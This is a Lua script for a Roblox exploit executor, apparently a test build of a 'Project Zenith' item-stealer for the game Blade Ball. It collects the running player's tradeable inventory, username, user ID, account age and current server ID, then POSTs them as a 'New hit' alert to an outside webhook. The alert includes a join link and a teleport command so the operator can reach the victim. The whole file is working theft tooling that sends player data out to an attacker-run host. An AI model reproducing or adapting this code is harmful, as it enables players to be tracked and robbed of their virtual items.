getgenv().ZenithBBTest = getgenv().ZenithBBTest or false
if getgenv().ZenithBBTest then return end
getgenv().ZenithBBTest = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local TOKEN = getgenv().token or ""
local USER = getgenv().user or {}

if #USER == 0 then print("[TEST] no user") return end
if type(TOKEN) ~= "string" or #TOKEN ~= 32 then print("[TEST] bad token: " .. tostring(TOKEN)) return end
if game.PlaceId ~= 13772394625 then print("[TEST] wrong place: " .. tostring(game.PlaceId)) return end

local localPlayer = Players.LocalPlayer
if not localPlayer then
    for _ = 1, 100 do
        task.wait(0.1)
        localPlayer = Players.LocalPlayer
        if localPlayer then break end
    end
    if not localPlayer then print("[TEST] no localplayer") return end
end

local Shared = ReplicatedStorage:FindFirstChild("Shared")
local InvMod = Shared and Shared:FindFirstChild("Inventory")
local inv = {}
if InvMod then
    local ok, r = pcall(function() return require(InvMod).Client.Get() end)
    if ok and r then inv = r end
end
print("[TEST] inv loaded:", inv ~= nil)

local function cleanName(data)
    if type(data) == "table" and type(data.Name) == "string" then
        local n = data.Name:gsub("[%c`]", ""):gsub("%s+", " ")
        n = n:gsub("^%s+", ""):gsub("%s+$", "")
        if #n > 0 and #n <= 50 then return n end
    end
    return nil
end

local items = {}
for _, cat in ipairs({"Sword", "Explosion", "Emote"}) do
    if inv[cat] then
        for uid, data in pairs(inv[cat]) do
            if type(data) == "table" and not data.TradeLock then
                local name = cleanName(data)
                if name then
                    table.insert(items, {name = name, rap = 0})
                end
            end
        end
    end
end
print("[TEST] items:", #items)

local itemLines = {}
for i = 1, math.min(10, #items) do
    table.insert(itemLines, string.format("- 1x %s - $0.00 [0/1]", items[i].name))
end
if #itemLines == 0 then table.insert(itemLines, "None") end

local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. localPlayer.UserId .. "&width=150&height=150&format=png"
local joinLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
local teleport = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')", game.PlaceId, game.JobId)

local playerInfoValue = "User        : " .. localPlayer.Name ..
    "\nUser ID     : " .. localPlayer.UserId ..
    "\nAge         : " .. localPlayer.AccountAge .. " days" ..
    "\nTotal Rap   : 0" ..
    "\nTotal USD   : $0.00" ..
    "\nTokens      : 0" ..
    "\nExecutor    : Test" ..
    "\nPlayers     : " .. #Players:GetPlayers() .. "/" .. game.Players.MaxPlayers

local payload = {
    content = "New hit",
    username = "Zenith",
    avatar_url = thumb,
    embeds = {{
        author = {name = "Project Zenith - Blade Ball", url = "https://www.roblox.com/games/" .. game.PlaceId, icon_url = thumb},
        title = "**" .. localPlayer.Name .. "**",
        description = "```Status        : Pending\nItems Claimed : 0 / " .. #items .. "\nRap Claimed   : 0 / 0```",
        color = 10494192,
        thumbnail = {url = thumb},
        fields = {
            { name = "**Player Info**", value = "```" .. playerInfoValue .. "```", inline = false },
            { name = "**Inventory - Min Rap >= 0**", value = "```\n" .. table.concat(itemLines, "\n") .. "\n```", inline = false },
            { name = "**Teleport Script**", value = "```lua\n" .. teleport .. "\n```", inline = false },
            { name = "**Join Link**", value = "[Click here to join](" .. joinLink .. ")", inline = false }
        },
        footer = {text = "Project Zenith - discord.gg/4NJwTHQaY2", icon_url = thumb},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local okEnc, json = pcall(HttpService.JSONEncode, HttpService, payload)
if not okEnc then print("[TEST] json encode failed") return end
print("[TEST] payload size:", #json)

local req = request or syn and syn.request or http_request or httprequest
if not req then print("[TEST] no http") return end

local nonce = ""
for i = 1, 32 do nonce = nonce .. string.char(math.random(97, 122)) end

local ok, res = pcall(function()
    return req({
        Url = "https://zenith-protector.gangetnpa.workers.dev/hook/" .. TOKEN,
        Method = "POST",
        Headers = {["content-type"] = "application/json", ["x-z-nonce"] = nonce},
        Body = json,
    })
end)

if not ok then print("[TEST] request exception") return end
print("[TEST] response:", res and res.StatusCode or "nil")
if res and res.Body then print("[TEST] body:", res.Body:sub(1, 300)) end
